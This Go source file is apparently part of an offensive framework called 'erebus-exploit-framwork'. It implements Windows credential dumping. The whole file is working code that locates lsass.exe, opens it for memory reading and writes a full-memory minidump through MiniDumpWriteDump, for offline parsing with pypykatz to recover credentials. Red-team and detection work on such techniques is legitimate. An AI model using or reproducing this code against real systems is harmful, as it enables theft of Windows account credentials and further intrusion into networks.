//go:build windows

package creds

import (
	"context"
	"fmt"
	"os"
	"unsafe"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows"
)

var (
	dbghelp              = windows.NewLazyDLL("dbghelp.dll")
	procMiniDumpWriteDump = dbghelp.NewProc("MiniDumpWriteDump")
)

const miniDumpWithFullMemory = 0x00000002

func dumpLSASS(_ context.Context, cfg *pb.CredDumpConfig) (*pb.CredDumpResult, error) {
	pid := cfg.TargetPid
	if pid == 0 {
		// Find lsass.exe PID
		var err error
		pid, err = findProcessByName("lsass.exe")
		if err != nil {
			return nil, fmt.Errorf("find lsass.exe: %w", err)
		}
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ,
		false, pid,
	)
	if err != nil {
		return nil, fmt.Errorf("OpenProcess(%d): %w", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	// Create temp file for dump
	tmpFile, err := os.CreateTemp("", "dump-*.bin")
	if err != nil {
		return nil, fmt.Errorf("create temp file: %w", err)
	}
	tmpPath := tmpFile.Name()
	defer os.Remove(tmpPath)

	ret, _, err := procMiniDumpWriteDump.Call(
		uintptr(hProcess),
		uintptr(pid),
		tmpFile.Fd(),
		miniDumpWithFullMemory,
		0, 0, 0,
	)
	tmpFile.Close()

	if ret == 0 {
		return nil, fmt.Errorf("MiniDumpWriteDump: %w", err)
	}

	// Read the dump file
	dumpData, err := os.ReadFile(tmpPath)
	if err != nil {
		return nil, fmt.Errorf("read dump: %w", err)
	}

	return &pb.CredDumpResult{
		Method: "lsass",
		Credentials: []*pb.Credential{{
			Type:   "minidump",
			Source: fmt.Sprintf("lsass.exe (PID %d)", pid),
			Value:  fmt.Sprintf("raw dump: %d bytes (parse offline with pypykatz)", len(dumpData)),
		}},
	}, nil
}

func findProcessByName(name string) (uint32, error) {
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snap)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	err = windows.Process32First(snap, &entry)
	if err != nil {
		return 0, err
	}

	for {
		exeName := windows.UTF16ToString(entry.ExeFile[:])
		if exeName == name {
			return entry.ProcessID, nil
		}
		err = windows.Process32Next(snap, &entry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", name)
}
